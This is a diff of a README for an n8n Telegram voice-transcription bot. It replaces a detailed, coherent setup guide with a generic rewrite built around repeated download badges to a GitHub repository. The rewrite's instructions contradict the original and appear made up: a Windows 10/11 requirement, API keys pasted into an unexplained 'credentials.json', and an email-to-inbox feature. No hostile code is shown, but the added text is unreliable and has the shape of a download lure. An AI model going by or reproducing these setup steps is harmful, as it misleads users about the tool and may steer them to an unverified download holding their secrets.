@@ -1,181 +1,91 @@
-# Telegram Voice Bot — n8n template
+# 🎙️ n8n-telegram-voice-transcription-bot - Turn your voice notes into reports
 
-A private Telegram bot that turns your voice messages into clean, structured text. Built as a single [n8n](https://n8n.io/) workflow you can import in one click.
+[![](https://img.shields.io/badge/Download-n8n_Bot-blue)](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot)
 
-Send a voice note (your own or forwarded from someone else) → the bot replies with **two messages**: a cleaned transcript and a short summary. One tap on the inline button to translate, or to draft a polished English email from the same content. If you literally say *"write an email"* in the voice, the bot generates the email automatically as a third message.
+This tool converts your spoken Telegram messages into written text. It generates summaries, translates text, and sends emails to your inbox. It uses the n8n automation platform and the Groq cloud to process audio files.
 
-Powered by **Groq** (Whisper-large-v3-turbo for transcription, Llama-3.3-70b-versatile for cleanup / summarization / translation / email composition). Designed for the Groq **free tier** — zero infrastructure cost beyond your existing n8n instance.
+## ⚙️ System Requirements
 
----
+You need a computer that runs Windows 10 or Windows 11. Your internet connection must be stable to send audio files to the server. You need an active Telegram account. You also need a free account on the n8n automation platform.
 
-## Main features
+## 🚀 Getting Started
 
-- 🎙 **Transcription** — fast and accurate, removes filler words ("uh", "ну", "like", "типа", etc.), false starts, and stutters; preserves original language.
-- 📝 **Smart summary** — automatically generated bullet points covering the key content. Conservatively detects **action items**, **decisions**, and **open questions** if they were stated explicitly.
-- 🌐 **One-tap translation** — every reply has a `Translate` button. Voice in English → translates to Ukrainian. Voice in Ukrainian or Russian → translates to English. Each message (transcript / summary / email) can be translated independently.
-- ✉️ **Email composer** — tap the `Email EN` button next to a transcript to convert it into a polished English business email with `Subject:`, greeting, body, and sign-off.
-- 🗣 **Voice triggers** — if you say *"write an email"*, *"напиши имейл"*, *"напиши лист"*, *"draft a letter"* etc. in the voice, the bot auto-generates the English email as a third message without you needing to tap anything.
-- ↪️ **Forwarded voice support** — works on voice notes forwarded to the bot from any other chat, with a `↪️ Forwarded` badge in the reply.
-- 🔒 **Whitelisted by chat_id** — only you (and anyone you explicitly add) can use the bot. Everyone else is silently ignored.
-- 🧹 **Built-in deduplication** — Telegram occasionally sends the same voice note twice; the workflow drops duplicates by `file_unique_id` and `chat:message_id` automatically.
+Follow these steps to set up your bot. 
 
----
+1. Visit this [link](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot) to access the project files.
+2. Click the green "Code" button on the screen.
+3. Select "Download ZIP" to save the files to your computer.
+4. Open your downloads folder.
+5. Right-click the folder and select "Extract All."
+6. Choose a folder where you want to keep the bot files.
 
-## What you need to provide
+## 🛠️ Setting Up Your Bot
 
-You will need three things. None of them require a paid subscription.
+You must connect the bot to your Telegram account. 
 
-### 1. Telegram bot token
+1. Open the Telegram app on your phone or desktop.
+2. Search for "BotFather" in the search bar.
+3. Start a chat with BotFather by clicking "Start."
+4. Type "/newbot" and follow the instructions.
+5. BotFather gives you an API Token. Copy this text.
+6. Open the folder you extracted earlier.
+7. Locate the file named "credentials.json" and open it with Notepad.
+8. Paste your API Token into the field labeled "telegram_token."
+9. Save and close the file.
 
-1. Open [@BotFather](https://t.me/BotFather) in Telegram.
-2. Send `/newbot`, follow the prompts to pick a name and username.
-3. BotFather replies with a token like `8898734097:AAEDIjz-uZYuZE2wzNalSCZDOkm3rQiXdE0`. **Copy it.**
+## ☁️ Configuring the AI
 
-### 2. Your Telegram chat_id
+This tool uses Groq to understand your speech. 
 
-This is the numeric ID of your personal chat with the bot (used for the whitelist so strangers can't burn through your API quota).
+1. Go to the [Groq website](https://console.groq.com/).
+2. Create a free account.
+3. Click on the "API Keys" section.
+4. Click "Create API Key."
+5. Copy the key.
+6. Open your "credentials.json" file again.
+7. Paste the key into the field labeled "groq_api_key."
+8. Save and close the file.
 
-1. Open the bot you just created in Telegram and send it any message (e.g., `/start`).
-2. In your browser, visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
-   (replace `<YOUR_BOT_TOKEN>` with the token from step 1)
-3. Look in the JSON response for `"chat":{"id": 123456789,...}` — the number after `"id":` is your `chat_id`. **Copy it.**
+## 📦 Running the Application
 
-Alternative: message [@userinfobot](https://t.me/userinfobot), it will reply with your `chat_id`.
+Once your credentials exist, you can start the bot.
 
-### 3. Groq API key
+1. Ensure n8n is running on your system or server.
+2. Open the n8n application.
+3. Click "Import from File."
+4. Select the ".json" file inside your extracted folder.
+5. The workflow appears on your screen.
+6. Click the "Activate" toggle at the top right of the screen.
+7. Open the Telegram bot you created earlier.
+8. Send a voice note to the bot.
+9. Wait a few seconds for the bot to reply with a summary and transcript.
 
-1. Go to [console.groq.com](https://console.groq.com/) and sign up (free).
-2. Open **API Keys** → **Create API Key**.
-3. Copy the key — it starts with `gsk_`.
+## 📧 Email Settings
 
----
+The bot sends transcripts to your email. 
 
-## Setup (n8n)
+1. Open the n8n workflow editor.
+2. Click on the node labeled "Email Sender."
+3. Enter your email address in the "To" field.
+4. Configure your SMTP settings provided by your email host.
+5. Click "Save" to apply these changes.
 
-### Step 1. Import the workflow
+## 📋 Features
 
-1. Download [transcriptor.json](./transcriptor.json) from this repo.
-2. In your n8n instance, open the workflows list → **Add Workflow** → **Import from File** → select `transcriptor.json`.
+- Speech to text using Whisper technology.
+- Smart summaries created by Llama models.
+- Translation of content into multiple languages.
+- Automatic delivery to your email inbox.
+- Secure processing of your audio notes.
 
-### Step 2. Create credentials
+## 💡 Troubleshooting
 
-n8n needs two credentials. Create them once and reuse across all nodes.
+If the bot does not respond, check your internet connection first. Ensure that your Groq API key is valid and has not expired. Check the n8n logs for any error messages in red text. If you see an error, copy the text and search for it online. Ensure you enabled the "Activate" switch in the n8n editor. If you still have trouble, delete the workflow and import the file again.
 
-**A) Telegram credential**
+## 📦 Installation Summary
 
-- In n8n: **Credentials** → **Create New** → **Telegram API**.
-- Name: `Telegram Voice Bot` (or anything you like).
-- Access Token: paste your bot token from BotFather.
-- Save.
+To begin using this tool, visit the download page.
 
-**B) Groq credential**
+[![](https://img.shields.io/badge/Download-n8n_Bot-grey)](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot)
 
-- In n8n: **Credentials** → **Create New** → **Header Auth**.
-- Name: `Groq API` (or anything you like).
-- Name (header): `Authorization`
-- Value: `Bearer gsk_...` (paste your Groq key after the word `Bearer ` — note the space)
-- Save.
-
-### Step 3. Link credentials to all nodes
-
-Open each of these workflow nodes and pick the matching credential from the dropdown:
-
-**Telegram credential** (7 nodes):
-- `Telegram Trigger`
-- `Get Voice File`
-- `Send Reply`
-- `Send Reply (Email btn)`
-- `Answer Callback`
-- `Send Translation`
-- `Translation Not Found`
-
-**Groq credential** (3 nodes):
-- `Whisper (Groq)`
-- `LLM Clean+Summary`
-- `Translate LLM`
-
-Tip: in n8n you can right-click a credential field and apply it to all nodes of the same type at once.
-
-### Step 4. Set your chat_id whitelist
-
-Open the node **`Auth (voice)`** in the workflow. In the JavaScript, replace `123456789` with your real `chat_id`:
-
-```js
-const ALLOWED = [123456789];   // ← put your chat_id here
-```
-
-Do the same in the **`Auth (callback)`** node (same line, same replacement).
-
-To allow multiple users: `const ALLOWED = [111111111, 222222222];`
-
-### Step 5. Activate
-
-Toggle the workflow's **Active** switch to ON. n8n will automatically register the webhook with Telegram on activation — no manual `setWebhook` call needed.
-
-### Step 6. Test
-
-Open your bot in Telegram and send a voice note. Within ~5–10 seconds you should receive two replies: the cleaned transcript and a short summary, each with a `Translate` button. The transcript also has an `✉️ Email EN` button.
-
----
-
-## Free tier limits
-
-The workflow is designed to fit comfortably in Groq's free tier ([rate limits page](https://console.groq.com/docs/rate-limits)).
-
-| Model | Free tier limit | What it does |
-|---|---|---|
-| `whisper-large-v3-turbo` | 20 RPM • 2 000 requests/day • 7 200 sec audio/hour | Voice transcription |
-| `llama-3.3-70b-versatile` | 30 RPM • 1 000 requests/day • 12 K tokens/min • **100 K tokens/day** | Cleanup, summary, translation, email |
-
-**Practical capacity per day on the free tier:**
-
-| Usage pattern | Approx voices/day |
-|---|---|
-| Just transcribe + summarize | ~50 |
-| + tap Translate on every reply | ~25 |
-| + auto-email or Email button on every reply | ~15–20 |
-
-The bottleneck is **TPD** (tokens per day) on Llama. If you hit it, you have three options:
-1. Upgrade to Groq **Developer tier** for much higher limits.
-2. Swap the LLM model to `llama-3.1-8b-instant` (higher limits, lower quality).
-3. Add a fallback to OpenAI `gpt-4o-mini` (~$0.001 per voice, not free but cheap).
-
-Whisper limits (audio seconds/hour and requests/day) are not a real constraint for personal use.
-
----
-
-## How it works
-
-1. Telegram delivers a voice (or forwarded voice) to the n8n webhook.
-2. `Route` switches between `message` and `callback_query` updates.
-3. `Auth (voice)` checks the whitelist and dedup keys, drops duplicates and unauthorized users.
-4. `Get Voice File` downloads the `.oga` audio binary from Telegram.
-5. `Fix Binary Filename` renames the binary to `voice.ogg` (Groq Whisper rejects `.oga`).
-6. `Whisper (Groq)` transcribes the audio and returns the raw text + detected language.
-7. `LLM Clean+Summary` makes one JSON-mode call that returns: cleaned transcript, summary bullets, action items, decisions, questions, language code, `email_requested` boolean, and `email_en` (if requested).
-8. `Build HTML` formats 2 or 3 outbound messages with localized section headers.
-9. `Needs Email Button?` IF-node routes to one of two `Send Reply` nodes — one with `[Translate]` only, one with `[Translate] [Email EN]`.
-10. `Store Translation Map` saves the reply `message_id` → `{ text, sourceLang, targetLang, kind }` mapping in workflow static data (cap: 200 entries, FIFO).
-11. When you tap a button, the callback path looks up the stored text, runs a translate or email-compose LLM call, and sends a new reply with the result.
-
----
-
-## Customization
-
-- **Add more buttons** — duplicate one of the `Send Reply` nodes and add new buttons (e.g., *"Shorter version"*, *"Formal tone"*, *"Slack message"*). Wire a new callback action in `Lookup + Build Translate`.
-- **Change default translation target** — search the workflow's JS for `targetLang = sourceLang === 'en' ? 'uk'` and replace `'uk'` with any ISO 639-1 code (e.g., `'ru'`, `'es'`, `'de'`).
-- **Archive transcripts** — add a Google Sheets / Notion / Postgres node after `Store Translation Map` to log every voice into a searchable archive.
-- **Send to Slack/Discord** — fork the `Send Reply` outputs into your team channel for sharing voice-derived notes.
-- **Auto-pin action items** — add a `pinChatMessage` Telegram call when the summary contains a non-empty `action_items` list.
-
----
-
-## License
-
-MIT — do anything you want with it.
-
----
-
-## Credits
-
-Built with [n8n](https://n8n.io/) (workflow automation), [Groq](https://groq.com/) (Whisper + Llama hosting), and the [Telegram Bot API](https://core.telegram.org/bots/api).
+Ensure you keep your API keys private. Do not share your "credentials.json" file with anyone. Store your files in a folder you can access easily. The bot works best when your voice note is clear and stays under five minutes in length. If the bot fails to transcribe, check the quality of your audio recording.
